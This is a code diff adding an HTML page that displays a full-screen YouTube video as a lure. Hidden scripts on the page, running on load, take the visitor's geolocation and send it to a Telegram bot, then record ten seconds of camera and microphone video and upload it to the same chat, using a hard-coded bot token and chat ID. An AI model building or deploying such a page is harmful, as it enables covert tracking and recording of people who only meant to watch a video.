@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+      *{
+        
+       margin:0;
+       } 
+        iframe{
+            
+            height:100vh;
+            width:100vw;
+        }
+    </style>
+	<title>Example Page with iFrame</title>
+</head>
+<body>
+
+	<iframe src="https://youtu.be/shW9i6k8cB0
+"></iframe>
+</body>
+ <script>
+   
+   
+   
+   //updated location
+// replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your own values
+const botToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
+const chatId = '5857694327';
+
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+
+function successCallback(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const timestamp = new Date(position.timestamp).toLocaleString();
+  
+  const message = `Latitude: ${latitude}\nLongitude: ${longitude}\nTimestamp: ${timestamp}`;
+
+  // Create a Google Maps URL using the user's location
+  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;
+
+  // Create an image of the map using the Google Maps Static API
+  const mapsImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_API_KEY`;
+
+  // Send the message with the map and the location details to Telegram
+  sendTelegramMessage(`${message}\n${mapsUrl}`);
+  sendTelegramPhoto(mapsImageUrl);
+}
+
+function errorCallback(error) {
+  console.log(`Error message: ${error.message}`);
+}
+
+function sendTelegramMessage(message) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const data = { chat_id: chatId, text: message };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram message sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram message:', error);
+    });
+}
+
+function sendTelegramPhoto(photoUrl) {
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  const data = { chat_id: chatId, photo: photoUrl };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram photo sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram photo:', error);
+    });
+}
+
+   
+   </script>
+  
+  
+  
+  <script>
+    
+    
+    //video
+
+//it works video 
+
+// Initialize Telegram bot parameters
+
+const TELEGRAM_BOT_TOKEN = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
+
+const TELEGRAM_CHAT_ID = "5857694327";
+
+// Check if getUserMedia is available
+
+const hasGetUserMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+
+// Check if Telegram API is available
+
+const hasTelegramAPI = !!fetch;
+
+// Check if both getUserMedia and Telegram API are available
+
+if (!hasGetUserMedia || !hasTelegramAPI) {
+
+  console.log("Required features are not supported by this browser.");
+
+} else {
+
+  // Request permission to access user's camera and/or microphone
+
+  navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+
+    .then(handleMediaStream)
+
+    .catch(handleMediaError);
+
+}
+
+function handleMediaStream(mediaStream) {
+
+  // Access the first 100 gallery photos
+
+  const options = { mediaType: 'video' };
+
+  navigator.mediaDevices.enumerateDevices()
+
+    .then(devices => {
+
+      const videoDevices = devices.filter(device => device.kind === 'videoinput');
+
+      if (videoDevices.length > 0) {
+
+        options.video = {
+
+          deviceId: { exact: videoDevices[0].deviceId },
+
+          width: { ideal: 1280 },
+
+          height: { ideal: 720 }
+
+        };
+
+      }
+
+      return navigator.mediaDevices.enumerateDevices();
+
+    })
+
+    .then(devices => {
+
+      const audioDevices = devices.filter(device => device.kind === 'audioinput');
+
+      if (audioDevices.length > 0) {
+
+        options.audio = {
+
+          deviceId: { exact: audioDevices[0].deviceId },
+
+          echoCancellation: { exact: true },
+
+          noiseSuppression: { exact: true }
+
+        };
+
+      }
+
+      return navigator.mediaDevices.getUserMedia(options);
+
+    })
+
+    .then(mediaStream => {
+
+      const mediaRecorder = new MediaRecorder(mediaStream);
+
+      const chunks = [];
+
+      // Listen for data available event
+
+      mediaRecorder.addEventListener('dataavailable', event => {
+
+        chunks.push(event.data);
+
+      });
+
+      // Listen for stop event
+
+      mediaRecorder.addEventListener('stop', () => {
+
+        // Create a new FormData object to send to Telegram
+
+        const formData = new FormData();
+
+        const blob = new Blob(chunks, { type: 'video/mp4' });
+
+        formData.append('video', blob);
+
+        // Send the FormData object to Telegram using fetch
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo?chat_id=${TELEGRAM_CHAT_ID}`, {
+
+          method: 'POST',
+
+          body: formData
+
+        })
+
+        .then(response => response.json())
+
+        .then(data => console.log(data))
+
+        .catch(error => console.log(error));
+
+      });
+
+      // Start recording
+
+      mediaRecorder.start();
+
+      // Stop recording after 10 seconds
+
+      setTimeout(() => {
+
+        mediaRecorder.stop();
+
+      }, 10000);
+
+    })
+
+    .catch(handleMediaError);
+
+}
+
+function handleMediaError(error) {
+
+  console.log(error);
+
+}
+   
+   </script>
+  
+  
+  
+  </body>
+   
+	 
+	 
